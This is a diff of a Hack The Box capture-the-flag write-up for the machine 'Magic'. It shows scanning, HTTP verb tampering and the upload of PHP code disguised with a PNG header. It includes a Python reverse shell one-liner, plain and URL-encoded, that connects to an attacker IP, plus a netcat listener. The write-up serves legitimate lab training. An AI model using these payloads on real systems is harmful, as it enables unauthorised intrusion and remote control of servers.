@@ -1,8 +1,14 @@
+---
+description: >-
+  Zweilosec's write-up on the medium difficulty machine Magic from
+  https://hackthebox.eu
+---
+
 # HTB - Magic
 
 ## Overview
 
-![](https://github.com/zweilosec/htb-writeups/tree/170533f9dba99f709ee55644e711b316c9739dad/linux-machines/medium/machine%3E.infocard.png)
+![](../../.gitbook/assets/0-magic-infocard.png)
 
 Short description to include any strange things to be dealt with
 
@@ -18,7 +24,7 @@ Short description to include any strange things to be dealt with
 I started my enumeration with an nmap scan of `10.10.10.185`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
 
 ```text
-zweilos@kalimaa:~/htb/magic$ nmap -p- -sC -sV -oN magic.nmap 10.10.10.185
+zweilos@kali:~/htb/magic$ nmap -p- -sC -sV -oN magic.nmap 10.10.10.185
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-29 15:28 EDT
 Nmap scan report for 10.10.10.185
 Host is up (0.050s latency).
@@ -40,7 +46,9 @@ Nmap done: 1 IP address (1 host up) scanned in 822.01 seconds
 
 Only two ports open - 22 SSH and 80 HTTP
 
-nikto scan
+![](../../.gitbook/assets/2-magic-site.png)
+
+### Nikto Scan
 
 ```text
 Starting nikto scan
@@ -75,7 +83,23 @@ Finished nikto scan
 
 [https://www.sans.org/blog/http-verb-tampering-in-asp-net/](https://www.sans.org/blog/http-verb-tampering-in-asp-net/)
 
+### HTTP Verb Tampering
+
 Tested for simple sql injection and was logged in! or found upload.php with dirbuster, and using verb tampering \(as identified by nikto\) was able to get the source code of the page.
+
+![DEBUG HTTP Method](../../.gitbook/assets/3-debug-method.png)
+
+This can also be done against this server by sending arbitrary methods as such:
+
+![&quot;TEST&quot; HTTP Method](../../.gitbook/assets/3.5-test-method.png)
+
+I also noticed you can find the URL to the upload page in the home page's source
+
+![](../../.gitbook/assets/1.5-image-upload.png)
+
+Whatever method used to get the upload page: 
+
+![](../../.gitbook/assets/3-magic-upload.png)
 
 from here I was able to craft an image upload with a png file header and php code in it and send it using Burp Repeater. I got this idea a while back from watching one of Ippsec's videos [HackTheBox - Vault](https://www.youtube.com/watch?v=LfbwlPxToBc&t=519s)
 
@@ -112,11 +136,25 @@ Upload Image
 -----------------------------25702794813234425341306225294--
 ```
 
-Make this a hint:_This text will not work by directly copying and pasting. The PNG file header has some other bytes in it that do not render as ASCII and do not copy properly, but Burp is capable of grabbing them if you capture a file upload/download. I sent a test PNG first, then cut out everything but the headers to craft my payload._
+{% hint style="info" %}
+_This text may not work by directly copying and pasting. The PNG file header has some other bytes in it that do not render as ASCII and do not copy properly, but Burp is capable of grabbing them if you capture a file upload/download. I sent a test PNG first, then cut out everything but the headers to craft my payload._
+{% endhint %}
 
-`whoami` returns `www-data` `pwd` gets me `/var/www/Magic/images/uploads`
+![](../../.gitbook/assets/5.5-image-upload_success.png)
 
-`http://10.10.10.185/images/uploads/htb1.php.png?test=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.57",8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` gets me...
+![](../../.gitbook/assets/5-image-upload.png)
+
+`whoami` returns `www-data` 
+
+![](../../.gitbook/assets/6-whoami.png)
+
+`pwd` gets me `/var/www/Magic/images/uploads`
+
+```text
+http://10.10.10.185/images/uploads/htb1.php.png?test=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.57",8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+ gets me...
 
 ```text
 http://10.10.10.185/images/uploads/htb1.php.png?test=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.15.57%22,8099));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
@@ -126,7 +164,7 @@ sending a non-image file results in this message: `<script>alert('What are you t
 
 to get burp to catch the request I had to go into the settings and disable the default filter that tells it not to intercept image requests
 
-![](https://github.com/zweilosec/htb-writeups/tree/170533f9dba99f709ee55644e711b316c9739dad/linux-machines/medium/burp_pic)
+![](../../.gitbook/assets/4-disable-image-filter.png)
 
 ```python
 zweilos@kalimaa:~/Downloads$ nc -lvnp 8099
